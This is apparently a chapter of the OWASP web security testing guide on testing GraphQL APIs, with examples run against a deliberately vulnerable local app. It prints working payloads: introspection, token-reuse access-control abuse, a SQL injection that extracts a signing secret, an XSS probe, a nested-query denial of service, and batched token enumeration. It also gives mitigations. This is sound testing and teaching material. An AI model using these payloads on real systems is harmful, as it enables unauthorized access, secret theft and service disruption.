# WSTG APIT — API Testing

OWASP WSTG v4.2. Tests WSTG-APIT-01.

## Table of Contents

- [APIT-01 Testing GraphQL](#wstg-apit-01)

---

## WSTG-APIT-01

**Testing GraphQL**

Goal: assess a GraphQL deployment for unrestricted introspection, missing authorization enforcement, injection reachable through resolvers, and abusive-query denial-of-service — the common misconfigurations that recur across GraphQL APIs regardless of backend. Examples below are drawn from the vulnerable reference app `poc-graphql` (`localhost:8080/GraphQL`).

**Introspection queries** — GraphQL's introspection system lets a client ask the schema what queries, types, and mutations it supports. Send it as a normal HTTP request through a proxy:

```
query IntrospectionQuery {
__schema {
queryType {
name
}
mutationType {
name
}
subscriptionType {
name
}
types {
...FullType

}
directives {
name
description
locations
args {
...InputValue
}
}
}
}
fragment FullType on __Type {
kind
name
description
fields(includeDeprecated: true) {
name
description
args {
...InputValue
}
type {
...TypeRef
}
isDeprecated
deprecationReason
}
inputFields {
...InputValue
}
interfaces {
...TypeRef
}
enumValues(includeDeprecated: true) {
name
description
isDeprecated
deprecationReason
}
possibleTypes {
...TypeRef
}
}
fragment InputValue on __InputValue {
name
description
type {
...TypeRef
}
defaultValue
}
fragment TypeRef on __Type {
kind
name
ofType {
kind
name
ofType {
kind
name
ofType {
kind
name
ofType {
kind
name
ofType {
kind
name
ofType {

kind
name
ofType {
kind
name
}
}
}
}
}
}
}
}
```

The response contains the full schema (truncated here for brevity):

```
{
"data": {
"__schema": {
"queryType": {
"name": "Query"
},
"mutationType": {
"name": "Mutation"
},
"subscriptionType": {
"name": "Subscription"
},
"types": [
{
"kind": "ENUM",
"name": "__TypeKind",
"description": "An enum describing what kind of type a given __Type is",
"fields": null,
"inputFields": null,
"interfaces": null,
"enumValues": [
{
"name": "SCALAR",
"description": "Indicates this type is a scalar.",
"isDeprecated": false,
"deprecationReason": null
},
{
"name": "OBJECT",
"description": "Indicates this type is an object. `fields` and `interfaces` are valid
fields.",
"isDeprecated": false,
"deprecationReason": null
},
{
"name": "INTERFACE",
"description": "Indicates this type is an interface. `fields` and `possibleTypes` are
valid fields.",
"isDeprecated": false,
"deprecationReason": null
},
{
"name": "UNION",
"description": "Indicates this type is a union. `possibleTypes` is a valid field.",
"isDeprecated": false,
"deprecationReason": null
},
],

"possibleTypes": null
}
]
}
}
}
```

| Tool | Use |
|---|---|
| GraphQL Voyager | renders an ERD of the schema — shows types and their fields/relations at a glance, but omits mutations, so pair it with the methods below |
| GraphiQL | web IDE bundled with GraphQL; builds documentation from the schema; should not be exposed in production, but often reachable on staging |
| GraphQL Playground | standalone client; builds docs without manual introspection queries, supports multiple named sessions with different auth headers to probe authorization differences, and can send test payloads directly without a separate proxy |

Restricting introspection is the standard mitigation, but since GraphQL usually bridges straight to backend APIs, strict server-side access control matters more than hiding the schema.

**Authorization** — introspection is the first place to look for authorization gaps: once the schema and its sensitive fields are known, send queries as a lower-privileged or unauthenticated identity and see what still resolves. GraphQL enforces no authorization by default; it's entirely on the application. In the reference app, an `auth` query returns any veterinarian's auth token to any caller, authenticated or not, and that token can then drive mutations (e.g. associating/disassociating a dog) regardless of whether it matches the requester:

```
query brokenAccessControl {
myInfo(accessToken:"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdWQiOiJwb2MiLCJzdWIiOiJKdWxpZW4iLCJpc3M
iOiJBdXRoU3lzdGVtIiwiZXhwIjoxNjAzMjkxMDE2fQ.r3r0hRX_t7YLiZ2c2NronQ0eJp8fSs-sOUpLyK844ew",
veterinaryId: 2){
id, name, dogs {
name
}
}
}
```

```
{
"data": {
"myInfo": {

"id": 2,
"name": "Benoit",
"dogs": [
{
"name": "Babou"
},
{
"name": "Baboune"
},
{
"name": "Babylon"
},
{
"name": "..."
}
]
}
}
}
```

The returned dogs belong to Benoit, not to the token's actual owner — proof the server isn't checking token/resource ownership.

**Injection** — GraphQL is an API layer that typically forwards to a backend API or database directly, so any underlying injection class (SQLi, command injection, XSS, etc.) is reachable through it; the OWASP testing guide's other injection chapters apply, GraphQL just changes the entry point. Scalars for custom types (e.g. `DateTime`) have no built-in validation and are good fuzzing candidates.

*SQL injection* — the reference app concatenates the `namePrefix` argument of `dogs(namePrefix: String, limit: Int = 500): [Dog!]` directly into a SQL query:

```
query sqli {
dogs(namePrefix: "ab%' UNION ALL SELECT 50 AS ID, C.CFGVALUE AS NAME, NULL AS VETERINARY_ID FROM
CONFIG C LIMIT ? -- ", limit: 1000) {
id
name
}
}
```

```
{
"data": {
"dogs": [
{
"id": 1,
"name": "Abi"
},
{
"id": 2,
"name": "Abime"

},
{
"id": 3,
"name": "..."
},
{
"id": 50,
"name": "$Nf!S?(.}DtV2~:Txw6:?;D!M+Z34^"
}
]
}
}
```

The injected `UNION` pulls the JWT-signing secret out of the `CONFIG` table. Map the schema/table layout first, then use `sqlmap` to automate path discovery and extraction.

*Cross-site scripting* — see the Input Validation chapter's reflected-XSS test for payload technique. Error responses that reflect input verbatim are a common trigger point:

```
query xss {
myInfo(veterinaryId:"<script>alert('1')</script>" ,accessToken:"<script>alert('1')</script>") {
id
name
}
}
```

```
{
"data": null,
"errors": [
{
"message": "Validation error of type WrongType: argument 'veterinaryId' with value
'StringValue{value='<script>alert('1')</script>'}' is not a valid 'Int' @ 'myInfo'",
"locations": [
{
"line": 2,
"column": 10,
"sourceName": null
}
],
"description": "argument 'veterinaryId' with value 'StringValue{value='<script>alert('1')
</script>'}' is not a valid 'Int'",
"validationErrorType": "WrongType",
"queryPath": [
"myInfo"
],
"errorType": "ValidationError",
"extensions": null,
"path": null
}

]
}
```

**Denial of service via nested queries** — GraphQL's nested-object model lets a schema with a cycle (e.g. `Dog` → `Veterinary` → `Dog` → ...) be queried to an attacker-chosen depth, consuming CPU/memory like an unbounded recursive call:

```
query dos {
allDogs(onlyFree: false, limit: 1000000) {
id
name
veterinary {
id
name
dogs {
id
name
veterinary {
id
name
dogs {
id
name
veterinary {
id
name
dogs {
id
name
veterinary {
id
name
dogs {
id
name
veterinary {
id
name
dogs {
id
name
}
}
}
}
}
}
}
}
}
}
}
}
```

**Batching attacks** — GraphQL supports sending multiple queries in a single request:

```
[
{
query: < query 0 >,
variables: < variables for query 0 >,
},
{
query: < query 1 >,
variables: < variables for query 1 >,
},
{
query: < query n >
variables: < variables for query n >,
}
]
```

This lets an attacker fold what would be many individually-rate-limited or WAF-inspected requests into a couple of batched ones. In the reference app, veterinary IDs are guessable sequential integers, so a single batched request enumerates all veterinary names:

```
query {
Veterinary(id: "1") {
name
}
second:Veterinary(id: "2") {
name
}
third:Veterinary(id: "3") {
name
}
}
```

...and those names then drive a batched pull of every auth token:

```
query {
auth(veterinaryName: "Julien")
second: auth(veterinaryName:"Benoit")
}
```

Batching this way can defeat request-rate defenses and enables efficient enumeration or MFA/credential brute-forcing.

**Detailed error messages** — fuzz with unexpected input and check whether error responses leak internal details, stack context, or configuration.

**Exposure of the underlying API** — when GraphQL is a translation layer in front of a legacy REST-style API, check whether the underlying request (e.g. `id=1/delete` becoming `/api/users/1/delete`) is independently authorization-checked, or whether it silently inherits the GraphQL node's own privileges instead of the true requester's — this can enable privilege escalation via direct manipulation of the underlying API's parameters.

**Remediation**

| Risk | Mitigation |
|---|---|
| Introspection | restrict access to introspection queries |
| Unvalidated input | validate input at the schema level (`graphql-constraint-directive` project); combine with standard injection defenses, since input validation alone isn't a complete fix |
| Abusive/deep queries | enforce timeouts; cap maximum query depth; cap maximum query complexity; throttle by server-time or query-complexity consumption |
| Verbose errors | return generic error messages that don't reveal deployment details |
| Batching abuse | rate-limit at the object level; disallow batching for sensitive objects; cap concurrently running queries |

See the GraphQL Cheat Sheet for further hardening detail.

**Tools**: GraphQL Playground, GraphQL Voyager, sqlmap, InQL (Burp extension), GraphQL Raider (Burp extension), GraphQL add-on for OWASP ZAP.

**Refs**: poc-graphql; GraphQL Official Site; Howtographql — Security; GraphQL Constraint Directive; Client-side Testing (XSS and other vulnerabilities); *5 Common GraphQL Security Vulnerabilities*; *GraphQL common vulnerabilities and how to exploit them*.
